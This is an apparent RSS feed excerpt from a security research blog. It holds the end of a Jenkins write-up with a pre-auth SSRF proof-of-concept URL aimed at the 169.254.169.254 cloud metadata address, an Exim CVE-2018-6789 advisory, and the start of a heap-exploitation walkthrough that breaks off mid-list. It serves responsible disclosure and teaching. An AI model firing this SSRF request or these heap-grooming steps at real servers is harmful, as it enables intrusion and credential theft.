&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-chained-with-cve-2018-1000600-to-a-pre-auth-fully-responded-ssrf&quot;&gt;2. Chained with CVE-2018-1000600 to a Pre-auth Fully-responded SSRF&lt;/h3&gt;

&lt;p&gt;The next bug is &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, this bug is reported by &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Yes, it’s me :P). About this vulnerability, the official description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It can extract any stored credentials with known credentials ID in Jenkins. But the credentials ID is a random UUID if there is no user-supplied value provided. So it seems impossible to exploit this?(Or if someone know how to obtain credentials ID, please tell me!)&lt;/p&gt;

&lt;p&gt;Although it can’t extract any credentials without known credentials ID, there is still another attack primitive - a fully-response SSRF! We all know how hard it is to exploit a Blind SSRF, so that’s why a fully-responded SSRF is so valuable!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-pre-auth-remote-code-execution&quot;&gt;3. Pre-auth Remote Code Execution&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;PLEASE DON’T BULLSHIT, WHERE IS THE RCE!!!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to maximize the impact, I also find an &lt;strong&gt;INTERESTING&lt;/strong&gt; remote code execution can be chained with this vulnerability to a well-deserved pre-auth RCE! But it’s still on the responsible disclosure process. Please wait and see the Part 2! (Will be published on February 19th :P)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Here is my todo list which can make this vulnerability more perfect. If you find any of them please tell me, really appreciate it :P&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; object reference under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. If this can be done, it can bypass the ACL restriction of &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; and &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; to a indeed pre-auth arbitrary file reading!&lt;/li&gt;
  &lt;li&gt;Find another gadget to invoke the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. In order to fix &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins applies a &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;check&lt;/a&gt; on &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; to ensure the least privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt;. So the original gadget will fail after Jenkins version 2.138.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Thanks Jenkins Security team especially Daniel Beck for the coordination and bug fixing! Here is the brief timeline:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - Report vulnerabilities to Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins patched the bug and assigned CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins patched the bug and assigned CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - Report Groovy vulnerability to Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins patched Groovy vulnerability and assigned CVE-2019-1003000, CVE-2019-1003001 and CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim 任意代碼執行漏洞 (CVE-2018-6789)</title>
                <description>&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;

&lt;p&gt;今年我們向 Exim 回報了一個位於 base64 解碼函式的溢出漏洞，編號為 &lt;strong&gt;CVE-2018-6789&lt;/strong&gt;。此漏洞從 Exim 專案開始時即存在，因此&lt;strong&gt;影響 Exim 的所有版本&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;根據我們的研究，攻擊者可利用此漏洞達成&lt;strong&gt;遠端任意代碼執行，並且不需任何認證&lt;/strong&gt;，至少有 40 萬台 Exim 伺服器受此漏洞影響並存在被攻擊的風險。我們建議立即將 Exim &lt;strong&gt;升級至 4.90.1 版&lt;/strong&gt;以免遭受攻擊。&lt;/p&gt;

&lt;h2 id=&quot;細節&quot;&gt;細節&lt;/h2&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：
&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
                <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;All Exim versions below 4.90.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;one-byte-overflow-in-base64-decoding&quot;&gt;One byte overflow in base64 decoding&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;

&lt;p&gt;This is a calculation mistake of decode buffer length in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b64decode&lt;/code&gt; function:
&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/base64.c#L153&quot;&gt;base64.c: 153 b64decode&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).
Generally, this bug is harmless because the memory overwritten is usually unused. However, this byte overwrites some critical data when the string fits some specific length. In addition, this byte is controllable, which makes exploitation more feasible.
Base64 decoding is such a fundamental function and therefore this bug can be triggered easily, causing remote code execution.
&lt;a id=&quot;back&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;To estimate the severity of this bug, we developed an exploit targeting SMTP daemon of exim. The exploitation mechanism used to achieve pre-auth remote code execution is described in the following paragraphs. In order to leverage this one byte overflow, it is necessary to trick memory management mechanism. It is highly recommended to have basic knowledge of heap exploitation &lt;a href=&quot;#heap_exp&quot;&gt;[ref]&lt;/a&gt; before reading this section.&lt;/p&gt;

&lt;p&gt;We developed the exploit with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Debian(stretch)&lt;/strong&gt; and &lt;strong&gt;Ubuntu(zesty)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTP daemon of Exim4 package&lt;/strong&gt; installed with apt-get (4.89/4.88)&lt;/li&gt;
  &lt;li&gt;Config enabled (uncommented in default config) &lt;strong&gt;CRAM-MD5 authenticator&lt;/strong&gt; (any other authenticator using base64 also works)&lt;/li&gt;
  &lt;li&gt;Basic SMTP commands (&lt;strong&gt;EHLO, MAIL FROM/RCPT TO&lt;/strong&gt;) and &lt;strong&gt;AUTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;memory-allocation&quot;&gt;Memory allocation&lt;/h4&gt;

&lt;p&gt;First, we review the source code and search for useful memory allocation. As we mentioned in the &lt;a href=&quot;&quot;&gt;previous article&lt;/a&gt;, exim uses self-defined functions for dynamic allocation:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_extend_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* The */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_free_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* value of the */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* 2nd arg is   */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_perm_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* __FILE__ in  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_malloc_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* every call,  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_release_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* so give its  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_reset_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* correct type */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; of glibc directly. Glibc takes a slightly bigger (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes) &lt;strong&gt;chunk&lt;/strong&gt; and stores its metadata in the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (x86-64) on every allocation, and then returns the location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;. The following illustration describes structure of chunk:
&lt;img src=&quot;/assets/img/blog/20180306/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metadata includes size of previous chunk (the one exactly above in memory), size of current block and some flags. The first three bits of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; are used to store flags. In this example, size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x81&lt;/code&gt; implies current chunk is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80&lt;/code&gt; bytes and the previous chunk is in use.
Most of released chunks used in exim are put into a doubly linked list called &lt;strong&gt;unsorted bin&lt;/strong&gt;. Glibc maintains it according to the flags, and merges adjacent released chunks into a bigger chunk to avoid fragmentation. For every allocation request, glibc checks these chunks in an FIFO (first in, first-out) order and reuses the chunks.&lt;/p&gt;

&lt;p&gt;For some performance issues, exim maintains its own linked list structure with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt;.
&lt;img src=&quot;/assets/img/blog/20180306/2.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;
The main feature of storeblocks is that every block is at least &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; bytes, which becomes a restriction to our exploitation. Note that a storeblock is also the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; of a chunk. Therefore, if we look into the memory, it is like:
&lt;img src=&quot;/assets/img/blog/20180306/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we list functions used to arrange heap data:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;EHLO hostname
  For each EHLO(or HELO) command, exim stores the pointer of hostname in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; old name&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; for new name&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L1833&quot;&gt;smtp_in.c: 1833 check_helo&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1839&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Discard any previous helo name */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1840&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1841&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1842&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1843&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;store_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1844&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1845&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1884&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_copy_malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1885&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Unrecognized command
  For every unrecognized command with unprintable characters, exim allocates a buffer to convert it to printable
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; to store error message&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L5725&quot;&gt;smtp_in.c: 5725 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;5725&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5726&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unrecognized command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;AUTH
